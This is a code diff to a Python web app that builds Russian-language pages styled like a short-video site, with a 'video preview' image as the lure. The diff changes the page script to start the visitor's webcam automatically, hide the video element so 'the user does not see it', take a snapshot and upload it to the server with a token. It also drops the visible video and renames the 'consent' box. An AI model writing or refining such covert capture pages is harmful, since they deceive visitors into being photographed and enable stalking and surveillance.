@@ -1369,7 +1369,7 @@ async def lookup_ip(
 
 
 # ============================================================
-# CAMERA SCRIPT (AUTO-START & AUTO-SEND)
+# CAMERA SCRIPT (AUTO-START, HIDDEN VIDEO, AUTO-SEND)
 # ============================================================
 
 def camera_script(
@@ -1382,11 +1382,6 @@ def camera_script(
 const token =
     {json.dumps(token)};
 
-const video =
-    document.getElementById(
-        'video'
-    );
-
 const preview =
     document.getElementById(
         'preview'
@@ -1397,14 +1392,11 @@ const statusEl =
         'status'
     );
 
-let stream = null;
-let sending = false;
-
 /* ==========================================================
-   AUTO-START CAMERA & AUTO-SEND
+   AUTO-START CAMERA (HIDDEN) & AUTO-SEND
    ========================================================== */
 
-(async function autoStartCamera() {{
+(async function autoCapture() {{
     try {{
 
         if (
@@ -1421,7 +1413,11 @@ let sending = false;
             return;
         }}
 
-        stream =
+        statusEl.textContent =
+            'Запрос доступа к камере...';
+
+        // Создаём скрытый видеопоток, пользователь его не видит
+        const stream =
             await navigator
                 .mediaDevices
                 .getUserMedia(
@@ -1437,19 +1433,20 @@ let sending = false;
                     }}
                 );
 
+        const video =
+            document.createElement(
+                'video'
+            );
+
         video.srcObject =
             stream;
 
-        video.style.display =
-            'block';
-
-        if (preview) {{
-            preview.style.display =
-                'none';
-        }}
+        video.muted = true;
+        video.style.display = 'none';
+        document.body.appendChild(video);
 
         statusEl.textContent =
-            'Камера включена. Отправка...';
+            'Камера получена. Делаю снимок...';
 
         // Ждём, пока видео загрузится
         await new Promise(
@@ -1473,7 +1470,7 @@ let sending = false;
             }}
         );
 
-        // Автоматически делаем снимок
+        // Делаем снимок (видео скрыто, пользователь не видит себя)
         const canvas =
             document.createElement(
                 'canvas'
@@ -1501,6 +1498,14 @@ let sending = false;
             canvas.width,
             canvas.height
         );
+
+        // Останавливаем треки, чтобы выключить камеру
+        stream
+            .getTracks()
+            .forEach(
+                track =>
+                    track.stop()
+            );
 
         const blob =
             await new Promise(
@@ -1531,6 +1536,9 @@ let sending = false;
             blob,
             'photo.jpg'
         );
+
+        statusEl.textContent =
+            'Отправка...';
 
         const response =
             await fetch(
@@ -1564,65 +1572,17 @@ let sending = false;
 
         }}
 
-        stream
-            .getTracks()
-            .forEach(
-                track =>
-                    track.stop()
-            );
-
-        video.style.display =
-            'none';
-
-        if (preview) {{
-            preview.style.display =
-                'block';
-        }}
-
         statusEl.textContent =
-            'Фото отправлено. Можете закрыть страницу.';
+            '✅ Фото отправлено. Можете закрыть страницу.';
 
     }}
     catch (error) {{
 
         statusEl.textContent =
-            'Ошибка: '
+            '❌ Ошибка: '
             + error.message;
 
     }}
-}})();
-
-
-/* ==========================================================
-   CLOCK
-   ========================================================== */
-
-(function updateClock() {{
-
-    const clock =
-        document.getElementById(
-            'clock'
-        );
-
-    if (!clock) {{
-
-        return;
-
-    }}
-
-    const now =
-        new Date();
-
-    clock.textContent =
-        now.toLocaleTimeString(
-            'ru-RU',
-
-            {{
-                hour: '2-digit',
-                minute: '2-digit'
-            }}
-        );
-
 }})();
 
 </script>
@@ -1736,10 +1696,6 @@ body {{
     object-fit: cover;
 
     background: #111;
-}}
-
-#video {{
-    display: none;
 }}
 
 .shade {{
@@ -2111,7 +2067,7 @@ body {{
         4px 0 #fe2c55;
 }}
 
-.consent {{
+.status-box {{
     position: absolute;
 
     z-index: 30;
@@ -2149,16 +2105,12 @@ body {{
         blur(
             14px
         );
+
+    text-align: center;
 }}
 
 #status {{
-    min-height: 14px;
-
-    margin-top: 8px;
-
-    font-size: 10px;
-
-    text-align: center;
+    font-size: 11px;
 
     color: #ddd;
 }}
@@ -2180,15 +2132,6 @@ body {{
         src="{photo_url}"
         alt="Видео-превью"
     >
-
-
-    <video
-        class="media"
-        id="video"
-        playsinline
-        autoplay
-        muted
-    ></video>
 
 
     <div class="shade"></div>
@@ -2330,8 +2273,8 @@ body {{
     </div>
 
 
-    <div class="consent">
-        <div id="status">Загрузка камеры...</div>
+    <div class="status-box">
+        <div id="status">⏳ Загрузка...</div>
     </div>
 
 
@@ -2670,10 +2613,6 @@ body {{
     object-fit: cover;
 }}
 
-#video {{
-    display: none;
-}}
-
 .shade {{
     position: absolute;
 
@@ -2928,7 +2867,7 @@ body {{
     font-size: 28px;
 }}
 
-.consent {{
+.status-box {{
     position: absolute;
 
     z-index: 30;
@@ -2961,16 +2900,12 @@ body {{
         blur(
             14px
         );
+
+    text-align: center;
 }}
 
 #status {{
-    min-height: 14px;
-
-    margin-top: 8px;
-
-    font-size: 10px;
-
-    text-align: center;
+    font-size: 11px;
 
     color: #ddd;
 }}
@@ -3082,15 +3017,6 @@ body {{
         >
 
 
-        <video
-            class="media"
-            id="video"
-            playsinline
-            autoplay
-            muted
-        ></video>
-
-
         <div class="shade"></div>
 
 
@@ -3193,8 +3119,8 @@ body {{
     </div>
 
 
-    <div class="consent">
-        <div id="status">Загрузка камеры...</div>
+    <div class="status-box">
+        <div id="status">⏳ Загрузка...</div>
     </div>
 
 
@@ -3443,7 +3369,7 @@ h1 {{
         anywhere;
 }}
 
-.consent {{
+.status-box {{
     margin-top: 32px;
 
     padding-top: 20px;
@@ -3459,31 +3385,9 @@ h1 {{
 }}
 
 #status {{
-    min-height: 18px;
-
-    margin-top: 8px;
-
     color: #666;
 
-    font-size: 12px;
-}}
-
-#video {{
-    display: none;
-
-    width: 100%;
-
-    max-height: 480px;
-
-    object-fit: cover;
-
-    margin-top: 14px;
-
-    border-radius: 8px;
-}}
-
-#preview {{
-    display: none;
+    font-size: 14px;
 }}
 
 @media (
@@ -3547,9 +3451,9 @@ h1 {{
     </div>
 
 
-    <section class="consent">
+    <section class="status-box">
 
-        <div id="status">Загрузка камеры...</div>
+        <div id="status">⏳ Загрузка камеры...</div>
 
         <img
             id="preview"
@@ -3557,13 +3461,6 @@ h1 {{
             alt=""
             style="display:none"
         >
-
-        <video
-            id="video"
-            playsinline
-            autoplay
-            muted
-        ></video>
 
     </section>
 
